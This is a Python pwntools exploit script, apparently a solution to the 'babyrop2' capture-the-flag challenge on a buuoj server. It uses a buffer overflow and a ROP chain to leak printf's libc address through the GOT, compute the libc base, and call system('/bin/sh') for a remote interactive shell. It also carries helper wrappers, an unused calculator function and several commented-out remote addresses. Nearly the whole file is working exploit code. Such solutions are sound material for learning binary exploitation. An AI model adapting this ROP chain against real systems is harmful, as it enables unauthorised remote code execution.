# import time
from pwn import *


# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 9999)
# io = remote("192.168.170.128", 1234)
io = remote("node4.buuoj.cn", 28933)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)

# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result

elf = ELF('./babyrop2')
read_got = elf.got['read']
printf_plt = elf.plt['printf']

libc = ELF('./libc.so.6')

context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

fmt_addr = 0x400770
pop_rdi = 0x0000000000400733
pop_rsi_r15_ret = 0x0000000000400731
ret = 0x00000000004004d1
main_addr = 0x400636

ru(b"What's your name?")
payload = (b'a' * 0x28 + p64(pop_rdi) + p64(fmt_addr) + p64(pop_rsi_r15_ret) + p64(read_got)
           + p64(0) + p64(printf_plt) + p64(main_addr))
sl(payload)
ru(b'!')
printf_addr = get_addr()
print(hex(printf_addr))
libc_base = printf_addr - 0xF7250
system = libc_base + 0x45390
binsh = libc_base + 0x018CD57
payload1 = b'a' * 0x28 + p64(pop_rdi) + p64(binsh) + p64(system) + p64(0xdeadbeef)
ru(b"What's your name?")
sl(payload1)

inter()